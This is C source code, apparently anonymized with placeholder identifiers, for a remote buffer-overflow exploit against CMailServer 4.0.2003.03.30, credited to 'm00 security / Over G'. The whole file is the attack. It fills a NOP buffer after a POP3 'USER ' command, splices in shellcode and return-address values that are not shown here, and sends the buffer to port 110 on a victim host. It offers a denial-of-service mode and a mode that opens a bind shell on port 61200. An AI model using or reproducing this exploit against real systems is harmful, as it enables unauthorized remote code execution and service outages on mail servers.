
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_2__ TYPE_1__ ;


struct TYPE_2__ {char s_addr; } ;
struct sockaddr_in {int sin_port; int sin_family; TYPE_1__ sin_addr; } ;
struct sockaddr {int dummy; } ;
struct hostent {char* h_addr; int h_length; } ;
typedef int sock ;
typedef int WSADATA ;
typedef int WORD ;
typedef scalar_t__ SOCKET ;


 int VAR_0 ;
 scalar_t__ VAR_1 ;
 int FUNC_0 (int,int) ;
 int VAR_2 ;
 int FUNC_1 (int) ;
 scalar_t__ FUNC_2 (int ,int *) ;
 int FUNC_3 (scalar_t__) ;
 scalar_t__ FUNC_4 (scalar_t__,struct sockaddr*,int) ;
 int FUNC_5 (int) ;
 struct hostent* FUNC_6 (char*) ;
 int FUNC_7 (int) ;
 char* VAR_3 ;
 int FUNC_8 (char*,char*,int) ;
 int FUNC_9 (char*,...) ;
 char* VAR_4 ;
 int FUNC_10 (scalar_t__,char*,int,int ) ;
 char* VAR_5 ;
 scalar_t__ FUNC_11 (int ,int ,int ) ;
 int FUNC_12 (char*) ;
 scalar_t__ FUNC_13 (char*,char*) ;

int FUNC_14(int VAR_6, char *VAR_7[])
{
 WSADATA VAR_8;
 WORD VAR_9;
 struct hostent *VAR_10;
 struct sockaddr_in VAR_11;
 SOCKET VAR_12; int VAR_13;
 char *VAR_14,*VAR_15;
 char VAR_16[2101];

 FUNC_9("\nRemote exploit for CMailServer 4.0.2003.03.30 by m00 security / Over G\n");
 FUNC_9("	         www.m00.ru 	  overg[at]mail.ru\n\n");

 if (VAR_6 < 3) {
  FUNC_9("Usage: %s <victim_host> <type>\n",VAR_7[0]);
  FUNC_9("type:\n -d DoS attack\n -s Bind shell on port 61200\n\n");
  return 0;
 }

 VAR_14 = VAR_7[1];
 VAR_15 = VAR_7[2];
 for(VAR_13 = 0; VAR_13 < 2100; VAR_13++) VAR_16[VAR_13] = 0x90;
 FUNC_8(&VAR_16[0], "USER ", 5);

 if (FUNC_13(VAR_15,"-s")) {
  FUNC_8(&VAR_16[515],VAR_4,FUNC_12(VAR_4));
  FUNC_8(&VAR_16[519],VAR_3,FUNC_12(VAR_3));
  FUNC_8(&VAR_16[519+FUNC_12(VAR_3)+870],VAR_5,FUNC_12(VAR_5));
 }

 VAR_9 = FUNC_0(1, 1);
 if (FUNC_2(VAR_9, &VAR_8) < 0) return -1;

 VAR_12 = FUNC_11(VAR_0, VAR_2, 0);
 if(VAR_12==VAR_1)
 {
  FUNC_9("Socket error!\r\n");
  FUNC_5(1);
 }

 FUNC_9("[+] Resolving hostname... ");
 if ((VAR_10 = FUNC_6(VAR_14)) == ((void*)0))
 {
  FUNC_9("FAILED :( \n");
  FUNC_5(1);
 }

 FUNC_9(" OK \n");

 FUNC_8(&VAR_11.sin_addr.s_addr, VAR_10->h_addr, VAR_10->h_length);
 VAR_11.sin_family = VAR_0;
 VAR_11.sin_port = FUNC_7(110);

 FUNC_9("[+] Connecting... ");
 if ( (FUNC_4(VAR_12, (struct sockaddr *)&VAR_11, sizeof (VAR_11) )))
 {
  FUNC_9(" FAILED :( \n");
  FUNC_5(1);
 }
 FUNC_9(" OK\n");
 FUNC_9("[+] Sending exploit buffer...");
 FUNC_10(VAR_12, VAR_16, 2100, 0);
 if (FUNC_10(VAR_12, "\r\n", 2, 0) == -1)
 {
  FUNC_9(" FAILED :( \n");
  FUNC_3(VAR_12);
  FUNC_5(1);
 }
 FUNC_1(100);
 FUNC_9(" OK. \n\n[+] Use telnet for connect to %s:61200\n\n",VAR_7[1]);
 FUNC_3(VAR_12);
return 0;
}
